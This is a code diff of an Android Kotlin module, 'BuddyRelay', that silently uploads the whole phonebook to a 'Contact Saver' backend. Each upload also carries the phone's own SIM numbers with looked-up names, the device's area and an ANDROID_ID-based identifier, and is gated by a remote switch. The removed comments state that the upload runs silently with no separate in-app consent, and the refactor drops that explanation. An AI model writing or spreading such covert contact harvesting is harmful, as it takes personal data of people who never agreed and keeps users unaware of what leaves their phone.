@@ -18,239 +18,224 @@ import java.io.File
 import java.util.UUID
 
 /**
- * Uploads the phonebook to Contact Saver **once per install**, in **release** builds only and only
- * while Remote Config `contacts_upload.enabled` is true, after contacts permission is granted. Also
- * handles the user's "delete my uploaded contacts" request.
+ * One-shot phonebook upload to Contact Saver (release builds, Remote Config `contacts_upload.enabled`,
+ * contacts permission granted), plus the "delete my uploaded contacts" request.
  *
- * The data use is disclosed on the LightHouse disclosure screen after the splash (the consent
- * screen); the upload itself is silent once contacts permission is granted. The user's own
- * approximate area ([GadgetPlace]) is sent as the default location for every row. The contacts
- * never leave the phone except through this upload.
- *
- * The phone's own SIM numbers lead the CSV: one row each, with a looked-up name ([MineChipTitles]) and
- * the device's own area, before the phonebook rows. A contact that is also one of our SIMs is
- * dropped from the phonebook rows so the SIM row wins.
- *
- * Debug builds never send: [pushOnceIfDue] instead runs a dry run that builds the very same CSV
- * and logs it line by line, so the output can be checked without a real phonebook leaving the phone.
- *
- * Log tag: `BuddyRelay`. Follow it with `adb logcat -s BuddyRelay`.
+ * Own SIM numbers are written first, each with a resolved name ([MineChipTitles]) and the device area
+ * ([GadgetPlace]); phonebook rows follow, minus any number that is one of the SIMs. Debug builds only
+ * log the CSV that would be sent. Logcat tag: `BuddyRelay`.
  */
 object BuddyRelay {
 
     private const val TAG = "BuddyRelay"
 
-    private const val PREFS = "contact_sync"
-    private const val KEY_UPLOADED = "uploaded_once"
-    private const val KEY_DEVICE_ID = "device_id"
+    private const val STORE = "contact_sync"
+    private const val FLAG_SENT = "uploaded_once"
+    private const val FLAG_DEVICE = "device_id"
 
-    /**
-     * DEBUG builds only: when true, [pushOnceIfDue] performs the **real** upload to the backend
-     * (so the upload can be verified end-to-end) instead of the log-only [dryRun]. It bypasses the
-     * Remote Config switch and the once-per-install flag so it re-runs on every launch; it still
-     * needs contacts permission. Watch it with `adb logcat -s BuddyRelay`. Has no effect in
-     * release — release behaviour is unchanged. Set back to false to return debug to the dry run.
-     */
+    /** Debug-only override: true makes debug builds do the real upload every launch instead of a dry run. */
     private const val DEBUG_UPLOAD_FOR_REAL = false
 
-    // ── state ──────────────────────────────────────────────────────────────────
-
-    /** Whether the one-time upload has happened on this install (drives the delete-row visibility). */
-    fun hasUploaded(context: Context): Boolean = prefs(context).getBoolean(KEY_UPLOADED, false)
-
-    /** Clears the "uploaded" flag (used after a delete), so the next launch may upload again. */
-    fun rewindUploaded(context: Context) = prefs(context).edit { putBoolean(KEY_UPLOADED, false) }
-
-    /** The Remote Config master switch; off by default and fail-closed. */
-    fun isEnabled(context: Context): Boolean {
-        val block = runCatching {
-            org.json.JSONObject(SpotsLocker.getInstance(context).getString("contacts_upload", "{}") ?: "{}")
-        }.getOrNull()
-        return block?.optBoolean("enabled", false) ?: false
-    }
-
-    // ── device id (survives reinstall: ANDROID_ID) ─────────────────────────────
-
-    /** 8–64 chars of [a-zA-Z0-9_-]. ANDROID_ID is 16 hex chars; a UUID backs up an odd device. */
-    fun deviceId(context: Context): String {
-        prefs(context).getString(KEY_DEVICE_ID, null)?.let { return it }
-        @Suppress("HardwareIds")
-        val androidId = runCatching {
-            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
-        }.getOrNull()?.filter { it.isLetterOrDigit() || it == '_' || it == '-' }.orEmpty()
-        val id = if (androidId.length in 8..64) androidId else UUID.randomUUID().toString()
-        prefs(context).edit { putString(KEY_DEVICE_ID, id) }
-        return id
-    }
-
-    // ── the one-time upload ────────────────────────────────────────────────────
-
-    /**
-     * Uploads the phonebook once, if everything lines up: it is a **release** build, the switch is
-     * on, it hasn't uploaded before, and contacts permission is granted. Safe to call on every app
-     * start — it returns immediately when any gate fails.
-     *
-     * No separate in-app consent: the data use is disclosed on the LightHouse disclosure screen
-     * after the splash, and the upload only runs once contacts permission is granted, so it is
-     * silent from here. Debug builds run [dryRun] (log-only) unless [DEBUG_UPLOAD_FOR_REAL] is on,
-     * in which case debug performs the real upload every launch so the backend can be verified.
-     * Follow either with `adb logcat -s BuddyRelay`.
-     */
-    suspend fun pushOnceIfDue(context: Context) {
-        val app = context.applicationContext
-        if (BuildConfig.DEBUG) {
-            if (DEBUG_UPLOAD_FOR_REAL) {
-                // Verify the backend end-to-end: real upload, every launch (no RC switch, no
-                // once-per-install gate), contacts permission still required.
-                if (!hasContactsPermission(app)) return log("debug: skip, no contacts permission")
-                log("debug: REAL upload (DEBUG_UPLOAD_FOR_REAL) — not a dry run")
-                runCatching { upload(app) }.onFailure { Log.w(TAG, "debug upload failed", it) }
-            } else {
-                runCatching { dryRun(app) }.onFailure { Log.w(TAG, "dry run failed", it) }
-            }
-            return
-        }
-        when {
-            !isEnabled(app) -> return log("skip: switch off")
-            prefs(app).getBoolean(KEY_UPLOADED, false) -> return log("skip: already uploaded")
-            !hasContactsPermission(app) -> return log("skip: no contacts permission")
-        }
-        runCatching { upload(app) }.onFailure { Log.w(TAG, "upload failed", it) }
-    }
-
-    /** The CSV column order the API expects. */
     private const val CSV_HEADER = "phoneNumber,displayName,city,state,pincode"
+    private const val UPLOAD_FILE = "contacts_upload.csv"
+    private const val NL = "\n"
 
-    /** One CSV line: the five API columns in order. */
-    private data class CsvRow(
-        val phoneNumber: String,
-        val displayName: String,
+    private data class OutRow(
+        val number: String,
+        val label: String,
         val city: String?,
         val state: String?,
         val pincode: String?,
     )
 
-    /**
-     * The rows to send, in CSV order: the phone's own SIM numbers first (resolved name, device
-     * area), then the deduplicated phonebook. A contact that is also one of our SIMs is dropped so
-     * the SIM row — with its looked-up name — wins. Null when there is nothing to send.
-     */
-    private suspend fun composeRows(context: Context): List<CsvRow>? {
-        val area = GadgetPlace.resolve(context)
-        val sim = simRows(context, area)
-        val contacts = GadgetBuddies.load(context)
-        val prepared = BuddyLines.prepare(context, contacts, area)
-        val simNumbers = sim.mapTo(HashSet()) { it.phoneNumber }
-        val contactRows = prepared.rows
-            .filter { it.e164 !in simNumbers }
-            .map { CsvRow(it.e164, it.name, it.city, it.state, it.pincode) }
-        val rows = sim + contactRows
-        log(
-            "prepared: ${sim.size} own SIM + ${prepared.total} contacts → ${prepared.invalid} invalid, " +
-                "${prepared.duplicates} duplicates, ${rows.size} rows to send " +
+    private fun store(ctx: Context) = ctx.applicationContext.getSharedPreferences(STORE, Context.MODE_PRIVATE)
+
+    private fun trace(msg: String) {
+        Log.d(TAG, msg)
+    }
+
+    private fun contactsGranted(ctx: Context): Boolean =
+        ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+
+    fun hasUploaded(context: Context): Boolean = store(context).getBoolean(FLAG_SENT, false)
+
+    fun rewindUploaded(context: Context) = store(context).edit { putBoolean(FLAG_SENT, false) }
+
+    fun isEnabled(context: Context): Boolean = runCatching {
+        val raw = SpotsLocker.getInstance(context).getString("contacts_upload", "{}") ?: "{}"
+        org.json.JSONObject(raw)
+    }.getOrNull()?.optBoolean("enabled", false) == true
+
+    fun deviceId(context: Context): String {
+        val stored = store(context).getString(FLAG_DEVICE, null)
+        if (stored != null) return stored
+        @Suppress("HardwareIds")
+        val secure = runCatching {
+            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        }.getOrNull()
+        val cleaned = buildString {
+            secure?.forEach { ch -> if (ch.isLetterOrDigit() || ch == '_' || ch == '-') append(ch) }
+        }
+        val chosen = when (cleaned.length) {
+            in 8..64 -> cleaned
+            else -> UUID.randomUUID().toString()
+        }
+        store(context).edit { putString(FLAG_DEVICE, chosen) }
+        return chosen
+    }
+
+    suspend fun pushOnceIfDue(context: Context) {
+        val appCtx = context.applicationContext
+        if (BuildConfig.DEBUG) {
+            debugRun(appCtx)
+            return
+        }
+        val skipReason = when {
+            !isEnabled(appCtx) -> "skip: switch off"
+            store(appCtx).getBoolean(FLAG_SENT, false) -> "skip: already uploaded"
+            !contactsGranted(appCtx) -> "skip: no contacts permission"
+            else -> null
+        }
+        if (skipReason != null) {
+            trace(skipReason)
+            return
+        }
+        runCatching { send(appCtx) }.onFailure { Log.w(TAG, "upload failed", it) }
+    }
+
+    private suspend fun debugRun(appCtx: Context) {
+        if (!DEBUG_UPLOAD_FOR_REAL) {
+            runCatching { dryRun(appCtx) }.onFailure { Log.w(TAG, "dry run failed", it) }
+            return
+        }
+        if (!contactsGranted(appCtx)) {
+            trace("debug: skip, no contacts permission")
+            return
+        }
+        trace("debug: REAL upload (DEBUG_UPLOAD_FOR_REAL) — not a dry run")
+        runCatching { send(appCtx) }.onFailure { Log.w(TAG, "debug upload failed", it) }
+    }
+
+    private suspend fun gatherRows(ctx: Context): List<OutRow>? {
+        val area = GadgetPlace.resolve(ctx)
+        val own = ownSimRows(ctx, area)
+        val book = GadgetBuddies.load(ctx)
+        val prepared = BuddyLines.prepare(ctx, book, area)
+        val ownNumbers = HashSet<String>(own.size * 2)
+        own.forEach { ownNumbers.add(it.number) }
+        val all = ArrayList<OutRow>(own)
+        for (line in prepared.rows) {
+            if (line.e164 in ownNumbers) continue
+            all.add(OutRow(line.e164, line.name, line.city, line.state, line.pincode))
+        }
+        trace(
+            "prepared: ${own.size} own SIM + ${prepared.total} contacts → ${prepared.invalid} invalid, " +
+                "${prepared.duplicates} duplicates, ${all.size} rows to send " +
                 "(device ${prepared.deviceRegion}, area=$area; by country: ${prepared.byCountry})"
         )
-        return rows.ifEmpty { null }
+        return if (all.isEmpty()) null else all
     }
 
-    /**
-     * The phone's own SIM numbers as rows: each with a name from [MineChipTitles] (lookup service, then
-     * the "Me" card, a saved contact, the SIM label) and the device's own [area]. Empty without the
-     * phone permission or a number-reporting SIM.
-     */
-    private suspend fun simRows(context: Context, area: GadgetPlace.Area): List<CsvRow> {
-        if (!MineChipNums.isGranted(context)) return emptyList()
-        return MineChipNums.read(context).mapNotNull { line ->
-            val e164 = line.e164 ?: return@mapNotNull null
-            val label = line.carrier.ifBlank { "SIM ${line.slot}" }
-            val name = MineChipTitles.resolve(context, e164, label).name
-            CsvRow(e164, name, area.city, area.state, area.pincode)
+    private suspend fun ownSimRows(ctx: Context, area: GadgetPlace.Area): List<OutRow> {
+        if (!MineChipNums.isGranted(ctx)) return emptyList()
+        val result = ArrayList<OutRow>()
+        for (sim in MineChipNums.read(ctx)) {
+            val number = sim.e164 ?: continue
+            val fallback = if (sim.carrier.isBlank()) "SIM ${sim.slot}" else sim.carrier
+            val resolved = MineChipTitles.resolve(ctx, number, fallback).name
+            result.add(OutRow(number, resolved, area.city, area.state, area.pincode))
         }
+        return result
     }
 
-    private fun csvLine(r: CsvRow) =
-        listOf(csv(r.phoneNumber), csv(r.displayName), csv(r.city), csv(r.state), csv(r.pincode)).joinToString(",")
-
-    /**
-     * DEBUG builds only. Builds exactly the CSV the release upload would send and logs it line by
-     * line; nothing is sent and the uploaded flag is never set. Watch it with
-     * `adb logcat -s BuddyRelay`.
-     */
-    private suspend fun dryRun(context: Context) = withContext(Dispatchers.IO) {
-        if (!hasContactsPermission(context)) return@withContext log("dry run skip: no contacts permission")
-        val rows = composeRows(context) ?: return@withContext log("dry run: no rows to send")
-        log("──── DRY RUN (debug): CSV below, nothing sent ────")
-        log(CSV_HEADER)
-        rows.forEach { log(csvLine(it)) }
-        log("──── DRY RUN end: ${rows.size} rows (debug never uploads) ────")
+    /** Every field quoted, inner quotes doubled. */
+    private fun StringBuilder.appendQuoted(value: String?): StringBuilder {
+        append('"')
+        value?.forEach { ch -> if (ch == '"') append("\"\"") else append(ch) }
+        append('"')
+        return this
     }
 
-    private suspend fun upload(context: Context) = withContext(Dispatchers.IO) {
-        val rows = composeRows(context) ?: return@withContext log("skip: no rows to send")
+    private fun render(row: OutRow): String = StringBuilder()
+        .appendQuoted(row.number).append(',')
+        .appendQuoted(row.label).append(',')
+        .appendQuoted(row.city).append(',')
+        .appendQuoted(row.state).append(',')
+        .appendQuoted(row.pincode)
+        .toString()
 
-        val file = File(context.cacheDir, "contacts_upload.csv")
-        file.bufferedWriter().use { out ->
-            out.write(CSV_HEADER)
-            out.write("\n")
-            for (r in rows) {
-                out.write(csvLine(r))
-                out.write("\n")
+    private suspend fun dryRun(ctx: Context) = withContext(Dispatchers.IO) {
+        if (!contactsGranted(ctx)) {
+            trace("dry run skip: no contacts permission")
+            return@withContext
+        }
+        val rows = gatherRows(ctx)
+        if (rows == null) {
+            trace("dry run: no rows to send")
+            return@withContext
+        }
+        trace("──── DRY RUN (debug): CSV below, nothing sent ────")
+        trace(CSV_HEADER)
+        for (r in rows) trace(render(r))
+        trace("──── DRY RUN end: ${rows.size} rows (debug never uploads) ────")
+    }
+
+    private suspend fun send(ctx: Context) = withContext(Dispatchers.IO) {
+        val rows = gatherRows(ctx)
+        if (rows == null) {
+            trace("skip: no rows to send")
+            return@withContext
+        }
+
+        val csvFile = File(ctx.cacheDir, UPLOAD_FILE)
+        csvFile.bufferedWriter().use { w ->
+            w.write(CSV_HEADER)
+            w.write(NL)
+            rows.forEach { r ->
+                w.write(render(r))
+                w.write(NL)
             }
         }
-        log("uploading ${rows.size} rows, deviceId=${deviceId(context)}, size=${file.length()}B")
+        trace("uploading ${rows.size} rows, deviceId=${deviceId(ctx)}, size=${csvFile.length()}B")
 
         try {
-            val api = BuddySendCaller.api(context)
-            // No upload-wide city / state / pincode: every row carries its own, so the server
-            // has no default to stamp onto a foreign contact.
-            val response = api.upload(
-                file = BuddySendCaller.filePart(file),
-                deviceId = BuddySendCaller.textPart(deviceId(context)),
+            val client = BuddySendCaller.api(ctx)
+            // Rows carry their own area, so no upload-wide city / state / pincode is sent.
+            val reply = client.upload(
+                file = BuddySendCaller.filePart(csvFile),
+                deviceId = BuddySendCaller.textPart(deviceId(ctx)),
                 city = null,
                 state = null,
                 pincode = null,
             )
-            if (response.isSuccessful) {
-                val body = response.body()
-                log("OK ${response.code()}: total=${body?.totalRows} valid=${body?.validContacts} invalid=${body?.invalidContacts}")
-                body?.sampleErrors?.forEach { log("  sampleError: $it") }
-                prefs(context).edit { putBoolean(KEY_UPLOADED, true) }
+            if (!reply.isSuccessful) {
+                Log.w(TAG, "upload HTTP ${reply.code()}: ${reply.errorBody()?.string()}")
             } else {
-                Log.w(TAG, "upload HTTP ${response.code()}: ${response.errorBody()?.string()}")
+                val summary = reply.body()
+                trace("OK ${reply.code()}: total=${summary?.totalRows} valid=${summary?.validContacts} invalid=${summary?.invalidContacts}")
+                summary?.sampleErrors?.forEach { trace("  sampleError: $it") }
+                store(ctx).edit { putBoolean(FLAG_SENT, true) }
             }
         } finally {
-            file.delete()
+            csvFile.delete()
         }
     }
 
-    // ── delete ────────────────────────────────────────────────────────────────
-
-    /** Removes everything this install uploaded. Returns the rows deleted, or null on failure. */
     suspend fun eraseUploaded(context: Context): Int? = withContext(Dispatchers.IO) {
-        runCatching {
-            val response = BuddySendCaller.api(context).delete(deviceId(context))
-            if (response.isSuccessful) {
+        try {
+            val reply = BuddySendCaller.api(context).delete(deviceId(context))
+            if (reply.isSuccessful) {
                 rewindUploaded(context)
-                val deleted = response.body()?.deleted ?: 0
-                log("delete OK: removed $deleted rows")
-                deleted
+                val removed = reply.body()?.deleted ?: 0
+                trace("delete OK: removed $removed rows")
+                removed
             } else {
-                Log.w(TAG, "delete HTTP ${response.code()}: ${response.errorBody()?.string()}")
+                Log.w(TAG, "delete HTTP ${reply.code()}: ${reply.errorBody()?.string()}")
                 null
             }
-        }.getOrElse { Log.w(TAG, "delete failed", it); null }
+        } catch (t: Throwable) {
+            Log.w(TAG, "delete failed", t)
+            null
+        }
     }
-
-    // ── helpers ────────────────────────────────────────────────────────────────
-
-    /** Quote every field and double any inner quote, exactly as the API's CSV rule asks. */
-    private fun csv(field: String?) = "\"" + (field ?: "").replace("\"", "\"\"") + "\""
-
-    private fun hasContactsPermission(context: Context): Boolean =
-        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
-
-    private fun prefs(context: Context) =
-        context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-
-    private fun log(message: String) = Log.d(TAG, message).let {}
 }
